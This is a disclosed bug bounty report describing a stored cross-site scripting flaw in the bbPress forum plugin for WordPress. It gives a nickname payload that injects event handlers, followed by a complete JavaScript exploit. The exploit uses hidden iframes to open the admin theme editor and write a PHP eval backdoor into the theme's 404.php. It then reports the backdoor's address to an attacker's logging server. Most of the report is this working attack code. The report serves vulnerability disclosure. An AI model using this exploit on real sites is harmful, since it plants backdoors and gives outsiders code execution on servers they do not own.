# [bbPress] Stored XSS in any forum post.

## Report Details
- **Report ID**: 151117
- **URL**: https://hackerone.com/reports/151117
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-13T12:38:02.036Z
- **Disclosed**: 2016-09-01T09:19:09.900Z

## Reporter
- **Username**: psych0tr1a
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
#__Intro:__
Encouraged by the success of cure53 and their reward, i start the research plugins in your scope. And almost immediately i found critical Stored XSS, which of course leeds to privelege escalation or PHP code execution. This vulnerability doesnt requres "special" preveleges like [CVE-2015-5622](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622 "CVE-2015-5622"). To demonstrate how this vulnerability elementary for expluatation i write a XSS to Shell exploit.


#__Steps to reproduce the XSS:__
1.  Send any message on topic or start new topic.
2.  Edit this message.
3.  Open http://localhost/wordpress/?bbp_user=%YOUR_USER_ID%&edit=1
4.  Edit your "Nickname" to:

		user1"onmouseover="alert(1);remove()"style="position:absolute;left:0;top:0;margin-top:-100%;margin-left:-100%;width:5000px;height:5000px"

5.  Change your "Display Name" to new "Nickname", save and return to thread with your message.

#__Screenshot:__
{F10472} (In attachment)

#__XSS to RCE PoC exploit:__

		var yourServer = "%Path to your logger%"

		var payload = "<?php eval($_GET['wp']); ?>"+"\n";
		SitePath = document.head.innerHTML.match(/rel=\"pingback\" href=\"(.*?)\/xmlrpc.php\"/m)[1]
		function eas(){ // edit and save
			ov = window.frames.win404.document.getElementById('newcontent').value
			window.frames.win404.document.getElementById('newcontent').value = payload + ov
			document.getElementsByName('win404')[0].setAttribute("onload","");
			window.frames.win404.document.getElementsByName('submit')[0].click()
			((new Image).src=yourServer+"?message=Check your backdoor here: "+SitePath+"/wp-content/themes/"+themeName+"/404.php?wp=phpinfo();")
		}

		function pao(){ // parse and open
			ewin = window.frames.editor.contentWindow || window.frames.contentDocument
			url404 = unescape(ewin.document.getElementById('templateside').getElementsByTagName('a')[0].href)
		        filepar = url404.match(/\?file\=(.*?)\&/m)[1]
			if(filepar.length>10){
				themeName = url404.match(/file\=\/themes\/(.*?)\//m)[1]
			}
			else{
				themeName = url404.match(/theme\=(.*?)$/m)[1]
			}
			var win404 = document.createElement("iframe");
			win404.style.opacity=0
			win404.name = 'win404';
			win404.src = url404
			win404.setAttribute("onload","eas();this.onload=''");
			document.body.appendChild(win404);
		}
		
		var editor = document.createElement("iframe");
		editor.style.opacity=0
		editor.name = 'editor';
		editor.src = SitePath+"/wp-admin/theme-editor.php";
		editor.setAttribute("onload","pao();this.onload='';");
		document.body.appendChild(editor);

Best regards!

## Attachments
- bbpress.PNG
